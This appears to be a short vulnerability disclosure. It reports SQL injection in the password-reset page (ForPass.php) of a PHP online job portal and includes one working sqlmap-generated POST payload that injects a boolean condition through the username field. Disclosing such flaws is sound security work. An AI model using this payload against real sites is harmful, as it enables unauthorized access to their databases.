# SQL Injection in Online Job Portal - Forget Password Module

Source code: https://www.sourcecodester.com/php/14518/online-job-portal-php-full-source-code-2020.html

## Code Audit

In `ForPass.php`, the query is vulnerable to SQL injection.

![](./1.jpg)

## Result of Sqlmap

![](./2.jpg)

One of the payloads is:

```
rdUser=JobSeeker&txtUserName=aa' OR NOT 5555=5555-- ZRQC&cmbQue=What is Your Pet Name?&txtAnswer=bb&button2=Submit
```